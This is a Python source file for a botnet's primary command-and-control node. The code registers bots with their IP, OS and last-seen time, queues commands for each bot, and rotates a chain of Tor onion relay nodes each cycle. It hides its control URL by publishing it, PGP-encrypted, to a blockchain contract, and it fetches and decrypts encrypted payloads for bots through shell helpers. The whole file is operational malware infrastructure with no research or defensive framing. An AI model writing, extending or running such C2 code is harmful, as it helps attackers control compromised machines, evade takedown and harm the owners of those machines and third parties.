# src/primary_node/primary_node.py
import base64
import csv
import json
import logging
import mimetypes
import os
import random
import subprocess
import threading
import time
import signal
from pathlib import Path
from typing import Dict, Optional, Tuple

import pgpy
import socks

import blockchain_utils
from stem.control import Controller
from src.crypto.utils import generate_aes_key, encrypt_aes, encrypt_pgp
from src.network.server import Server
from src.network.proxy_chain import ProxyChain
from src.node.node import Node

logging.getLogger("stem").setLevel(logging.WARNING)


def _candidate_contract_meta_paths() -> list[Path]:
    candidates: list[Path] = []

    env_path = os.environ.get("C2_CONTRACT_META")
    if env_path:
        candidates.append(Path(env_path).expanduser())

    module_path = Path(__file__).resolve()
    candidates.append(module_path.parent / "contract_meta.json")
    candidates.append(module_path.parent.parent / "contract_meta.json")
    candidates.append(module_path.parents[2] / "contract_meta.json")

    try:
        blockchain_dir = Path(blockchain_utils.__file__).resolve().parent
        candidates.append(blockchain_dir / "contract_meta.json")
    except Exception:
        pass

    unique: list[Path] = []
    seen: set[Path] = set()
    for candidate in candidates:
        try:
            resolved = candidate.resolve()
        except Exception:
            resolved = candidate
        if resolved in seen:
            continue
        seen.add(resolved)
        unique.append(resolved)
    return unique


def _load_contract_meta(explicit_path: Optional[Path] = None) -> Optional[dict]:
    paths: list[Path] = []
    if explicit_path:
        paths.append(explicit_path.expanduser())
    paths.extend(_candidate_contract_meta_paths())

    for path in paths:
        if not path.is_file():
            continue
        try:
            with path.open("r", encoding="utf-8") as fh:
                return json.load(fh)
        except Exception:
            continue
    return None


class PrimaryNode:
    """Primary node that creates 6 fresh ephemeral .onion services each lock-cycle."""

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8000,
        tor_control_port: int = 9051,
        tor_control_password: str = None,
        tor_socks_host: str = "127.0.0.1",
        tor_socks_port: int = 9050,
        payload_pubkey_path: str | None = None,
        ui_html_path: str | Path | None = None,
        persistent: bool = True,
        auto_lock_cycle: bool = True,
    ):
        self.host = host
        self.port = port
        self.node_keywords = [f"keyword_{i}" for i in range(8)]
        self.hashing_algorithms = ["sha256", "sha512", "sha3_256"]
        self.project_root = Path(__file__).resolve().parents[2]

        # initial proxy chain configuration (will be replaced on first lock cycle)
        self.proxy_chain_config = self.generate_proxy_chain_config()
        self.proxy_chain = ProxyChain(self.proxy_chain_config["node_configs"], self.proxy_chain_config["node_order"])

        # server that receives client requests (assumes Server accepts host, port, handler)
        self.server = Server(self.host, self.port, self.handle_client_request)
        self.server_thread: Optional[threading.Thread] = None

        # threading / runtime control
        self.lock_cycle_thread = None
        self.running = False
        self.persistent = persistent
        self.auto_lock_cycle = auto_lock_cycle
        self._tor_lock = threading.Lock()

        # Tor controller and ephemeral hidden services bookkeeping
        self.tor_control_port = tor_control_port
        self.tor_control_password = tor_control_password
        self.tor_controller: Controller | None = None
        # self.hidden_services maps service_id -> onion_addr (string)
        self.hidden_services: Dict[str, str] = {}
        self.distributed_nodes: Dict[str, Node] = {}
        self.distributed_node_meta: Dict[str, Dict[str, object]] = {}
        self.pending_commands: Dict[str, list] = {}
        self._registry_lock = threading.Lock()
        self.bot_registry_path = self.project_root / "Z3R0_Bot_Registry.csv"
        self.registered_bots: Dict[str, Dict[str, object]] = {}
        self.onion_address: Optional[str] = None
        self.tor_socks_host = tor_socks_host
        self.tor_socks_port = tor_socks_port
        default_pubkey_path = Path(payload_pubkey_path or os.path.join(os.path.expanduser("~"), ".AUTH", "Z3R0-public-key.asc"))
        self.payload_pubkey_path = default_pubkey_path.expanduser()
        self.latest_payload: Optional[Dict[str, str]] = None
        self._payload_pubkey_warning_logged = False
        self.ui_html_path = self._resolve_ui_html_path(ui_html_path)
        self.ui_root_dir = self.ui_html_path.parent.resolve() if self.ui_html_path else None
        self._ui_html_warning_logged = False

        self._load_bot_registry()

        # attempt to connect to Tor controller at init
        self._connect_to_tor_controller()
        persisted_onion = self._load_persisted_control_url()
        if persisted_onion:
            print(f"PrimaryNode: Restored persisted primary onion address: {persisted_onion}")
            self.publish_control_url_to_blockchain()

        # register signal handler for graceful shutdown
        self._install_signal_handlers()

    # -------------------------- Tor helper methods --------------------------
    def _connect_to_tor_controller(self) -> None:
        """Connect to local Tor control port (9051 by default)."""
        try:
            self.tor_controller = Controller.from_port(port=self.tor_control_port)
            if self.tor_control_password:
                self.tor_controller.authenticate(password=self.tor_control_password)
            else:
                self.tor_controller.authenticate()  # cookie or no-auth fallback
            print("PrimaryNode: Connected to Tor controller.")
        except Exception as e:
            print(f"PrimaryNode: Warning: Could not connect to Tor controller on port {self.tor_control_port}: {e}. Tor functionality will be unavailable.")
            self.tor_controller = None

    def _install_signal_handlers(self) -> None:
        """Install Ctrl+C handler to cleanup distributed nodes gracefully."""
        try:
            signal.signal(signal.SIGINT, self._handle_sigint)
        except (ValueError, RuntimeError):
            # signal registration can fail in some contexts (e.g., threads); ignore.
            pass

    def _handle_sigint(self, signum, frame) -> None:
        print("\n[!] PrimaryNode: SIGINT received, initiating graceful shutdown...")
        try:
            self.cleanup_distributed_nodes(keep_primary=True)
        except Exception as exc:
            print(f"[!] PrimaryNode: Error during distributed node cleanup: {exc}")
        finally:
            self.stop_server()

    def _control_url_targets(self) -> list[Path]:
        """Return candidate file paths that may contain the CONTROL-URL."""
        targets: list[Path] = []
        env_target = os.getenv("GHOST_COMM_PRIMARY_ONION_FILE")
        if env_target:
            targets.append(Path(env_target).expanduser())
        targets.append(Path.home() / "CONTROL-URL")
        return targets

    def _read_control_url(self, explicit_path: Optional[Path] = None) -> Tuple[Optional[str], Optional[Path]]:
        """
        Return (control_url, path_used) from the first readable candidate.
        """
        candidates: list[Path] = []
        if explicit_path:
            candidates.append(Path(explicit_path).expanduser())
        else:
            candidates.extend(self._control_url_targets())

        for candidate in candidates:
            try:
                control_url = candidate.read_text(encoding="utf-8").strip()
            except FileNotFoundError:
                continue
            except OSError as exc:
                print(f"PrimaryNode: Warning: failed to read control URL at {candidate}: {exc}")
                continue

            if not control_url:
                print(f"PrimaryNode: Warning: control URL file at {candidate} is empty.")
                continue

            return control_url, candidate
        return None, None

    def _load_persisted_control_url(self) -> Optional[str]:
        """Load a persisted CONTROL-URL into memory for continuity across boots."""
        control_url, _ = self._read_control_url()
        if not control_url:
            return None

        self.onion_address = control_url
        self.proxy_chain_config["primary_node_url"] = control_url
        return control_url

    def publish_control_url_to_blockchain(
        self,
        contract_meta_path: Optional[Path] = None,
        control_url_path: Optional[Path] = None,
        pgp_key_path: Optional[Path] = None,
    ) -> bool:
        """
        Encrypt the CONTROL-URL with the configured PGP key and push it to the registry contract.
        """
        control_url, used_path = self._read_control_url(control_url_path)
        if not control_url:
            print("PrimaryNode: Warning: no CONTROL-URL available; skipping blockchain update.")
            return False

        self.onion_address = control_url
        self.proxy_chain_config["primary_node_url"] = control_url

        key_path = Path(pgp_key_path or Path.home() / ".AUTH" / "Z3R0-public-key.asc").expanduser()
        if not key_path.is_file():
            print(f"PrimaryNode: Warning: PGP key not found at {key_path}")
            return False

        try:
            key, _ = pgpy.PGPKey.from_file(key_path)
            pub_key = key if key.is_public else key.pubkey
            encrypted_bytes = encrypt_pgp(control_url.encode("utf-8"), pub_key)
            encrypted_payload = base64.b64encode(encrypted_bytes).decode("ascii")
        except Exception as exc:
            print(f"PrimaryNode: Warning: failed to encrypt control URL for blockchain update: {exc}")
            return False

        payload = {
            "primary_node": control_url,
            "encrypted_control_url": encrypted_payload,
        }

        meta = _load_contract_meta(contract_meta_path)
        if not meta:
            print("PrimaryNode: Warning: contract metadata not found; unable to publish control URL.")
            return False

        try:
            web3 = blockchain_utils.get_web3()
            contract = blockchain_utils.get_contract_instance(web3, meta["address"], meta["abi"])
            blockchain_utils.set_c2_url(contract, web3, json.dumps(payload))
            descriptor = f" ({used_path})" if used_path else ""
            print(f"PrimaryNode: Published updated CONTROL-URL to blockchain{descriptor}.")
            return True
        except Exception as exc:
            print(f"PrimaryNode: Warning: failed to update blockchain contract: {exc}")
            return False

    def _create_ephemeral_service(self, local_port: int, await_publication: bool = True, publish_timeout: float = 20.0) -> Tuple[str, str] | None:
        """
        Create single ephemeral hidden service mapping Tor port 80 -> local_port.
        Returns (onion_addr, service_id) on success, or None on failure.
        """
        if not self.tor_controller:
            return None

        try:
            with self._tor_lock:
                service = self.tor_controller.create_ephemeral_hidden_service(
                    {80: local_port},
                    key_type="NEW",
                    key_content="ED25519-V3",
                    await_publication=await_publication
                )

            service_id = service.service_id
            onion_addr = f"{service_id}.onion"

            if not await_publication:
                deadline = time.time() + publish_timeout
                published = False
                while time.time() < deadline:
                    try:
                        with self._tor_lock:
                            info = (self.tor_controller.get_info("onions/current") or "")
                        if service_id in info:
                            published = True
                            break
                    except Exception:
                        pass
                    time.sleep(0.3)
                if not published:
                    with self._tor_lock:
                        try:
                            self.tor_controller.remove_ephemeral_hidden_service(service_id)
                        except Exception:
                            pass
                    print(f"PrimaryNode: Error: ephemeral onion {onion_addr} did not publish within {publish_timeout}s")
                    return None

            # record
            self.hidden_services[service_id] = onion_addr
            print(f"PrimaryNode: Created ephemeral hidden service: {onion_addr} -> local port {local_port}")
            return onion_addr, service_id

        except Exception as e:
            print(f"PrimaryNode: Error creating ephemeral hidden service (local_port={local_port}): {e}")
            return None

    def _remove_ephemeral_service(self, service_id: str) -> None:
        """Remove ephemeral hidden service by service_id (best-effort)."""
        if not self.tor_controller:
            return
        try:
            with self._tor_lock:
                # stem provides remove_ephemeral_hidden_service in modern versions
                # if not present, fallback to remove_hidden_service (older name)
                try:
                    self.tor_controller.remove_ephemeral_hidden_service(service_id)
                except AttributeError:
                    # older stem naming
                    self.tor_controller.remove_hidden_service(service_id)
            print(f"PrimaryNode: Removed ephemeral hidden service: {service_id}.onion")
        except Exception as e:
            print(f"PrimaryNode: Warning: could not remove ephemeral hidden service {service_id}: {e}")
        finally:
            self.hidden_services.pop(service_id, None)

    def _resolve_ui_html_path(self, ui_html_path: str | Path | None) -> Optional[Path]:
        """Determine which UI HTML file to serve for GET / requests."""
        candidates: list[Path] = []

        if ui_html_path:
            candidates.append(Path(ui_html_path).expanduser())

        env_path = os.environ.get("GHOST_COMM_PRIMARY_UI")
        if env_path:
            env_candidate = Path(env_path).expanduser()
            if env_candidate not in candidates:
                candidates.append(env_candidate)

        default_external = Path(os.path.expanduser("~/projects/botnet/WEB-GUI/GUI-index.html"))
        if default_external not in candidates:
            candidates.append(default_external)

        default_internal = self.project_root / "GUI-index.html"
        if default_internal not in candidates:
            candidates.append(default_internal)

        for candidate in candidates:
            if candidate.is_dir():
                for default_name in ("index.html", "GUI-index.html"):
                    default_candidate = candidate / default_name
                    if default_candidate.is_file():
                        resolved = default_candidate.resolve()
                        print(f"PrimaryNode: Serving UI from {resolved}")
                        return resolved
                continue
            if candidate.is_file():
                resolved = candidate.resolve()
                print(f"PrimaryNode: Serving UI from {resolved}")
                return resolved

        if candidates:
            print("PrimaryNode: Warning: no UI HTML file found in candidates: " + ", ".join(str(path) for path in candidates))

        return None

    def _safe_ui_path(self, relative_path: str) -> Optional[Path]:
        """Resolve UI asset path without allowing directory traversal."""
        if not self.ui_root_dir:
            return None
        base = self.ui_root_dir
        candidate = (base / relative_path).resolve()
        if base == candidate or base in candidate.parents:
            return candidate
        return None

    def _get_ui_asset(self, request_path: str) -> Optional[tuple[bytes, str]]:
        """Return bytes and content-type for the requested UI asset, if available."""
        if not self.ui_html_path:
            return None

        path_only = request_path.split("?", 1)[0].split("#", 1)[0]
        if path_only in ("", "/", "/index.html"):
            html_body = self._load_ui_html()
            if html_body is None:
                return None
            return html_body, "text/html; charset=utf-8"

        relative_path = path_only.lstrip("/")
        if not relative_path:
            html_body = self._load_ui_html()
            if html_body is None:
                return None
            return html_body, "text/html; charset=utf-8"

        if relative_path.endswith("/"):
            relative_path = relative_path.rstrip("/") + "/index.html"

        safe_path = self._safe_ui_path(relative_path)
        if not safe_path or not safe_path.is_file():
            # If the target is a directory, try default index files.
            if safe_path and safe_path.is_dir():
                for default_name in ("index.html", "GUI-index.html"):
                    default_path = safe_path / default_name
                    if default_path.is_file():
                        safe_path = default_path
                        break
                else:
                    return None
            else:
                # Allow implicit .html extension lookup.
                html_candidate = self._safe_ui_path(relative_path + ".html")
                if html_candidate and html_candidate.is_file():
                    safe_path = html_candidate
                else:
                    return None

        try:
            data = safe_path.read_bytes()
        except OSError as exc:
            print(f"PrimaryNode: Warning: could not read UI asset {safe_path}: {exc}")
            return None

        content_type = mimetypes.guess_type(str(safe_path))[0] or "application/octet-stream"
        if content_type == "text/html":
            content_type = "text/html; charset=utf-8"
        elif content_type == "text/css":
            content_type = "text/css; charset=utf-8"

        return data, content_type

    def _load_ui_html(self) -> Optional[bytes]:
        """Read the UI HTML content from disk."""
        if not self.ui_html_path:
            return None
        try:
            data = self.ui_html_path.read_bytes()
            self._ui_html_warning_logged = False
            return data
        except OSError as exc:
            if not self._ui_html_warning_logged:
                print(f"PrimaryNode: Warning: could not read UI HTML at {self.ui_html_path}: {exc}")
                self._ui_html_warning_logged = True
            return None

    def _load_payload_pubkey(self) -> Optional[str]:
        """Read the public key used to request payloads, logging warnings once."""
        try:
            key_text = self.payload_pubkey_path.read_text(encoding="utf-8")
            self._payload_pubkey_warning_logged = False
            return key_text
        except FileNotFoundError:
            if not self._payload_pubkey_warning_logged:
                print(f"PrimaryNode: Warning: payload public key not found at {self.payload_pubkey_path}")
                self._payload_pubkey_warning_logged = True
            return None
        except OSError as exc:
            if not self._payload_pubkey_warning_logged:
                print(f"PrimaryNode: Warning: could not read payload public key ({exc})")
                self._payload_pubkey_warning_logged = True
            return None

    def _retrieve_payload_via_onion(self) -> bool:
        """
        Fetch the latest payload from the primary node's own onion endpoint, if available.
        Stores the JSON response in self.latest_payload.
        """
        if not self.onion_address:
            return False

        pubkey_text = self._load_payload_pubkey()
        if not pubkey_text:
            return False

        request_body = json.dumps({
            "type": "get_payload",
            "pub_key": pubkey_text,
        }).encode("utf-8")

        host = self.onion_address
        request_lines = [
            "POST /payload HTTP/1.1",
            f"Host: {host}",
            "Content-Type: application/json",
            f"Content-Length: {len(request_body)}",
            "Connection: close",
            "",
            "",
        ]
        request_bytes = "\r\n".join(request_lines).encode("utf-8") + request_body

        sock: Optional[socks.socksocket] = None
        try:
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, self.tor_socks_host, self.tor_socks_port, rdns=True)
            sock.settimeout(30)
            sock.connect((host, 80))
            sock.sendall(request_bytes)

            response_chunks = []
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_chunks.append(chunk)
            response_data = b"".join(response_chunks)
        except Exception as exc:
            print(f"PrimaryNode: Warning: failed to retrieve payload via onion {host}: {exc}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

        header_bytes, sep, body = response_data.partition(b"\r\n\r\n")
        if not sep:
            print("PrimaryNode: Warning: invalid HTTP response when retrieving payload via onion.")
            return False

        try:
            status_line = header_bytes.decode("iso-8859-1").splitlines()[0]
            status_code = int(status_line.split(" ", 2)[1])
        except Exception:
            print("PrimaryNode: Warning: could not parse status line from payload response.")
            return False

        if status_code != 200:
            preview = body[:160].decode("utf-8", errors="replace")
            print(f"PrimaryNode: Warning: payload endpoint returned status {status_code}. Body preview: {preview}")
            return False

        try:
            payload_json = json.loads(body.decode("utf-8"))
        except json.JSONDecodeError as exc:
            print(f"PrimaryNode: Warning: could not decode payload JSON: {exc}")
            return False

        self.latest_payload = payload_json
        print("PrimaryNode: Retrieved lock-cycle payload via onion.")
        return True

    def _run_payload_pipeline(self, endpoint: str) -> None:
        """Invoke external helper scripts to fetch/decrypt payload and persist JSON."""
        get_script = self.project_root / "get_primary_payload.sh"
        decrypt_script = self.project_root / "decrypt_primary_payload.sh"
        target_path = Path.home() / ".AUTH" / "Network_Access_Payload.json"

        if not get_script.exists() or not decrypt_script.exists():
            return

        target_path.parent.mkdir(parents=True, exist_ok=True)

        payload_cache = self.project_root / "payload.json"

        command = (
            f'"{get_script}" "{endpoint}" > "{payload_cache}" && '
            f'bash "{decrypt_script}" "{payload_cache}" > "{target_path}"'
        )

        env = os.environ.copy()
        env.setdefault("TOR_SOCKS_HOST", str(self.tor_socks_host))
        env.setdefault("TOR_SOCKS_PORT", str(self.tor_socks_port))
        if "GPG_TTY" not in env:
            try:
                if os.isatty(0):
                    env["GPG_TTY"] = os.ttyname(0)
            except OSError:
                pass

        try:
            subprocess.run(
                ["bash", "-lc", command],
                check=True,
                cwd=str(self.project_root),
                env=env,
            )
            print(f"PrimaryNode: Updated decrypted payload at {target_path}")
        except subprocess.CalledProcessError as exc:
            print(f"PrimaryNode: Warning: failed to update decrypted payload via helper scripts: {exc}")

    # -------------------------- Lock-cycle onion creation --------------------------
    def create_lock_cycle_onions(
        self,
        count: int = 6,
        local_port: int | None = None,
        publish_timeout: float = 20.0,
        *,
        reset_existing: bool = True,
    ) -> Dict[str, Tuple[str, str]]:
        """
        Create `count` ephemeral .onion services for distributed nodes and update self.proxy_chain_config.

        Returns mapping { node_id: (onion_address, service_id) } for successfully created onions.
        On failure (Tor not connected) returns {}.
        """
        if local_port is None:
            local_port = self.port # This will be the PrimaryNode's port for its own onion service

        if not self.tor_controller:
            print("PrimaryNode: Tor controller not connected — cannot create onions.")
            return {}

        # 1) Stop and remove previous distributed nodes and their services
        if reset_existing:
            self.cleanup_distributed_nodes(keep_primary=True)

        # 2) Create new distributed Node instances and their ephemeral services
        created_node_info: Dict[str, Dict[str, str]] = {}
        node_ids = [f"node_{i}" for i in range(count)]
        random.shuffle(node_ids)

        for node_id in node_ids:
            # Create a new Node instance
            # We pass port=0 so the OS assigns a free port for the Node's server
            node_instance = Node(
                node_id=node_id,
                keyword=random.choice(self.node_keywords),
                hashing_algorithm=random.choice(self.hashing_algorithms),
                port=0, # Let OS assign a free port
                tor_control_port=self.tor_control_port,
                tor_control_password=self.tor_control_password
            )
            self.distributed_nodes[node_id] = node_instance

            # Start the Node's server and its hidden service
            node_instance.start_server()

            # Wait for the node to finish initialising its onion service and publish the PGP key.
            deadline = time.time() + max(5.0, publish_timeout)
            while time.time() < deadline:
                if node_instance.onion_address and node_instance.pgp_pubkey:
                    break
                time.sleep(0.25)

            if node_instance.onion_address and node_instance.pgp_pubkey:
                created_node_info[node_id] = {
                    "onion_address": node_instance.onion_address,
                    "pgp_pubkey": str(node_instance.pgp_pubkey) # Convert PGPKey object to string for serialization
                }
            else:
                print(f"PrimaryNode: Failed to create ephemeral onion or get pubkey for distributed node {node_id}; continuing")
                # Clean up the failed node
                node_instance.stop_server()
                self.distributed_nodes.pop(node_id)
                self.distributed_node_meta.pop(node_id, None)
                self.pending_commands.pop(node_id, None)
                continue

            self.distributed_node_meta[node_id] = {
                "created_at": time.time(),
                "last_seen": time.time(),
                "keyword": node_instance.keyword,
                "hashing_algorithm": node_instance.hashing_algorithm,
                "local_port": node_instance.port,
                "onion": node_instance.onion_address,
            }
            self.pending_commands.setdefault(node_id, [])

        # If some failed and we need to preserve chain length, add placeholders (though ideally we want all nodes to start)
        if len(created_node_info) < count:
            print(f"PrimaryNode: Warning: Only {len(created_node_info)} out of {count} distributed nodes started successfully.")

        # Randomise ordering of freshly created nodes before persisting configuration
        new_ids = list(created_node_info.keys())
        random.shuffle(new_ids)
        # rotate existing order to avoid predictable patterns while keeping healthy nodes
        existing_order = [node_id for node_id in self.proxy_chain_config.get("node_order", []) if node_id in self.distributed_nodes]
        self.proxy_chain_config["node_order"] = existing_order + [node_id for node_id in new_ids if node_id not in existing_order]

        self.build_proxy_chain_config()
        print(f"PrimaryNode: create_lock_cycle_onions: created {len(created_node_info)} distributed nodes, primary_node_url={self.proxy_chain_config['primary_node_url']}")
        # Retrieve the payload via the primary onion so we always have the latest encrypted bundle.
        self._retrieve_payload_via_onion()
        endpoint = f"http://{self.onion_address}/payload" if self.onion_address else f"http://{self.host}:{self.port}/payload"
        self._run_payload_pipeline(endpoint)
        return created_node_info

    # -------------------------- Other existing logic --------------------------
    def generate_proxy_chain_config(self) -> dict:
        """Generates a default proxy chain config used before onions exist."""
        # This method will now generate a config for the PrimaryNode's own onion service
        # and a placeholder for distributed nodes.
        config = {
            "node_order": [],
            "node_configs": {},
            "primary_node_url": f"{self.host}:{self.port}" # Default to direct address
        }
        print(f"PrimaryNode: Generated default proxy chain config: {config}")
        return config

    def build_proxy_chain_config(self) -> dict:
        """Construct a proxy chain configuration from currently active distributed nodes."""
        active_nodes: Dict[str, Dict[str, object]] = {}

        for node_id, node in self.distributed_nodes.items():
            if not node or not getattr(node, "running", False):
                continue
            onion_addr = getattr(node, "onion_address", None)
            if not onion_addr:
                continue
            active_nodes[node_id] = {
                "onion": onion_addr,
                "onion_address": onion_addr,
                "local_port": getattr(node, "port", 0),
                "keyword": getattr(node, "keyword", "auto"),
                "hashing_algorithm": getattr(node, "hashing_algorithm", "sha512"),
                "pgp_pubkey": str(getattr(node, "pgp_pubkey", "") or ""),
            }

        node_order = list(active_nodes.keys())
        random.shuffle(node_order)

        primary_url = self.onion_address or f"{self.host}:{self.port}"

        if not node_order:
            print("[DEBUG] PrimaryNode: No active nodes discovered while building proxy chain.")
            self.proxy_chain_config = self._build_stub_proxy_chain_config()
            return self.proxy_chain_config

        self.proxy_chain_config = {
            "node_order": node_order,
            "node_configs": active_nodes,
            "primary_node_url": primary_url,
        }
        self.proxy_chain = ProxyChain(active_nodes, node_order)
        print(f"[+] PrimaryNode: Built proxy chain with {len(node_order)} nodes.")
        print(f"[DEBUG] Active proxy chain: {node_order}")
        return self.proxy_chain_config

    def rebuild_proxy_chain_config_from_nodes(self) -> dict:
        """Backward-compatible wrapper to rebuild the proxy chain configuration."""
        return self.build_proxy_chain_config()

    def _build_stub_proxy_chain_config(self) -> dict:
        """Construct a minimal proxy chain configuration when no distributed nodes are available."""
        primary_url = self.onion_address or f"{self.host}:{self.port}"
        stub = {
            "node_order": ["node_0"],
            "node_configs": {
                "node_0": {
                    "onion": primary_url,
                    "onion_address": primary_url,
                    "local_port": self.port,
                    "keyword": "stub",
                    "hashing_algorithm": "sha256",
                    "pgp_pubkey": "",
                }
            },
            "primary_node_url": primary_url,
        }
        print(f"[DEBUG] PrimaryNode: Created stub proxy_chain_config: {stub}")
        self.proxy_chain_config = stub
        self.proxy_chain = ProxyChain(stub["node_configs"], stub["node_order"])
        return self.proxy_chain_config

    def cleanup_distributed_nodes(self, keep_primary: bool = True) -> None:
        """Stop and remove distributed nodes while optionally keeping the primary service online."""
        if not self.distributed_nodes:
            print("[DEBUG] PrimaryNode: No distributed nodes to clean up.")
        else:
            for node_id, node_instance in list(self.distributed_nodes.items()):
                try:
                    node_instance.stop_server()
                    print(f"[DEBUG] PrimaryNode: Removed distributed node {node_id}")
                except AttributeError:
                    print(f"[!] PrimaryNode: Node {node_id} missing stop_server attribute; skipping.")
                except Exception as exc:
                    print(f"[!] PrimaryNode: Failed to remove distributed node {node_id}: {exc}")
                finally:
                    self.distributed_nodes.pop(node_id, None)
                    self.distributed_node_meta.pop(node_id, None)
                    self.pending_commands.pop(node_id, None)

        if keep_primary:
            self.build_proxy_chain_config()
        else:
            # remove primary hidden service if requested
            if self.tor_controller and self.hidden_services:
                for sid in list(self.hidden_services.keys()):
                    try:
                        self._remove_ephemeral_service(sid)
                    except Exception as exc:
                        print(f"[!] PrimaryNode: Failed to remove hidden service {sid}: {exc}")
                self.hidden_services = {}
            self.onion_address = None
            self.proxy_chain_config = self.generate_proxy_chain_config()
            self.proxy_chain = ProxyChain(self.proxy_chain_config["node_configs"], self.proxy_chain_config["node_order"])

    def get_lock_cycle_payload(self, client_pub_key_pem: bytes) -> bytes:
        """Generates and encrypts the lock-cycle payload (AES + wrap AES key with client PGP)."""
        client_pub_key, _ = pgpy.PGPKey.from_blob(client_pub_key_pem)

        # Refresh proxy chain configuration using currently active nodes before packaging payload.
        self.ensure_proxy_chain_ready("payload generation")

        payload = {
            "proxy_chain_config": self.proxy_chain_config,
            "primary_node_url": self.proxy_chain_config.get("primary_node_url", f"{self.host}:{self.port}")
        }
        payload_bytes = json.dumps(payload).encode("utf-8")
        if not payload_bytes:
            print("[!] PrimaryNode: Attempted to encrypt empty payload; aborting send.")
            return b""

        print(f"[DEBUG] PrimaryNode: Payload to encrypt is {len(payload_bytes)} bytes.")

        # AES encryption for payload
        aes_key = generate_aes_key()
        encrypted_payload_aes = encrypt_aes(payload_bytes, aes_key)

        # wrap AES key with client PGP
        try:
            encrypted_aes_key_pgp = encrypt_pgp(aes_key, client_pub_key)
        except ValueError as exc:
            print(f"[!] PrimaryNode: Encryption error: {exc}")
            return b""

        return json.dumps({
            "encrypted_payload": encrypted_payload_aes.hex(),
            "encrypted_aes_key": encrypted_aes_key_pgp.hex()
        }).encode("utf-8")

    def ensure_proxy_chain_ready(self, context: str = "request") -> None:
        """Ensure proxy_chain_config is populated before responding to clients."""
        if not self.proxy_chain_config or not self.proxy_chain_config.get("node_order"):
            print(f"[!] PrimaryNode: proxy_chain_config empty during {context}; rebuilding...")
            self.build_proxy_chain_config()
        if not self.proxy_chain_config or not self.proxy_chain_config.get("node_order"):
            print(f"[!] PrimaryNode: proxy_chain_config still empty during {context}; using stub.")
            self._build_stub_proxy_chain_config()
        print(f"[DEBUG] PrimaryNode: Active proxy chain for {context}: {self.proxy_chain_config.get('node_order')}")

    def _build_registered_snapshot(self) -> Dict[str, Dict[str, object]]:
        now = time.time()
        snapshot: Dict[str, Dict[str, object]] = {}

        with self._registry_lock:
            entries = {bot_id: meta.copy() for bot_id, meta in self.registered_bots.items()}

        for bot_id, meta in entries.items():
            last_seen = float(meta.get("last_seen", 0) or 0)
            status = "red"
            if last_seen:
                age = now - last_seen
                if age <= 60:
                    status = "green"
                elif age <= 120:
                    status = "yellow"
            snapshot[bot_id] = {
                "status": status,
                "ip": meta.get("bot_ip"),
                "os": meta.get("bot_os"),
                "first_seen": meta.get("first_seen"),
                "last_seen": last_seen,
            }

        return snapshot

    def _build_node_snapshot(self) -> Dict[str, Dict[str, object]]:
        snapshot: Dict[str, Dict[str, object]] = {}
        for node_id, node in self.distributed_nodes.items():
            onion = getattr(node, "onion_address", None)
            local_port = getattr(node, "port", None)
            status = "green" if node and getattr(node, "running", False) and onion else "red"
            snapshot[node_id] = {
                "status": status,
                "onion": onion,
                "local_port": local_port,
                "keyword": getattr(node, "keyword", None),
                "hashing_algorithm": getattr(node, "hashing_algorithm", None),
            }
        return snapshot

    def _load_bot_registry(self) -> None:
        if not self.bot_registry_path.is_file():
            return
        try:
            with self.bot_registry_path.open("r", newline="", encoding="utf-8") as fh:
                reader = csv.DictReader(fh)
                loaded: Dict[str, Dict[str, object]] = {}
                for row in reader:
                    bot_id = row.get("bot_id") or row.get("BOT_ID")
                    if not bot_id:
                        continue
                    loaded[bot_id] = {
                        "bot_ip": row.get("bot_ip") or row.get("IP") or "",
                        "bot_os": row.get("bot_os") or row.get("OS") or "",
                        "first_seen": float(row.get("first_seen") or row.get("FIRST_SEEN") or time.time()),
                        "last_seen": float(row.get("last_seen") or row.get("LAST_SEEN") or time.time()),
                    }
            with self._registry_lock:
                self.registered_bots = loaded
                for bot_id in self.registered_bots:
                    self.pending_commands.setdefault(bot_id, [])
        except Exception as exc:
            print(f"[!] PrimaryNode: Failed to load bot registry: {exc}")

    def _write_bot_registry_locked(self) -> None:
        try:
            items = list(self.registered_bots.items())
            with self.bot_registry_path.open("w", newline="", encoding="utf-8") as fh:
                writer = csv.writer(fh)
                writer.writerow(["bot_id", "bot_ip", "bot_os", "first_seen", "last_seen"])
                for bot_id, meta in items:
                    writer.writerow([
                        bot_id,
                        meta.get("bot_ip", ""),
                        meta.get("bot_os", ""),
                        meta.get("first_seen", 0.0),
                        meta.get("last_seen", 0.0),
                    ])
        except Exception as exc:
            print(f"[!] PrimaryNode: Failed to write bot registry: {exc}")

    def _write_bot_registry(self) -> None:
        with self._registry_lock:
            self._write_bot_registry_locked()

    def _record_bot_registration(self, bot_id: str, bot_ip: str, bot_os: str) -> Dict[str, object]:
        now = time.time()
        with self._registry_lock:
            meta = self.registered_bots.get(bot_id, {
                "first_seen": now,
                "bot_ip": bot_ip,
                "bot_os": bot_os,
            })
            meta.setdefault("first_seen", now)
            if bot_ip:
                meta["bot_ip"] = bot_ip
            if bot_os:
                meta["bot_os"] = bot_os
            meta["last_seen"] = now
            self.registered_bots[bot_id] = meta
            self.pending_commands.setdefault(bot_id, [])
            self._write_bot_registry_locked()
        print(f"[+] PrimaryNode: Registered bot {bot_id} ({bot_os} @ {bot_ip})")
        return {
            "status": "ok",
            "bot_id": bot_id,
            "first_seen": meta.get("first_seen"),
        }

    def _record_bot_ping(self, bot_id: str) -> Dict[str, object]:
        now = time.time()
        with self._registry_lock:
            meta = self.registered_bots.get(bot_id)
            if not meta:
                meta = {
                    "first_seen": now,
                    "bot_ip": "",
                    "bot_os": "",
                }
            meta.setdefault("first_seen", now)
            meta["last_seen"] = now
            self.registered_bots[bot_id] = meta
            self.pending_commands.setdefault(bot_id, [])
            self._write_bot_registry_locked()
        return {"status": "ok", "bot": bot_id}

    def _note_bot_ping(self, bot_id: str) -> Dict[str, object]:
        meta = self.distributed_node_meta.setdefault(bot_id, {"created_at": time.time()})
        meta["last_seen"] = time.time()
        print(f"[DEBUG] PrimaryNode: Received ping from {bot_id}")
        return {"status": "ok", "bot": bot_id}

    def refresh_lock_cycle(self):
        """Refresh lock-cycle: create 6 new distributed nodes and their onion services."""
        print("[DEBUG] PrimaryNode: Refreshing lock-cycle...")

        self.cleanup_distributed_nodes(keep_primary=True)
        # Create fresh distributed nodes and their onion services
        self.create_lock_cycle_onions(count=6, publish_timeout=20.0, reset_existing=False)

        # after creation, self.proxy_chain_config and self.distributed_nodes are already updated
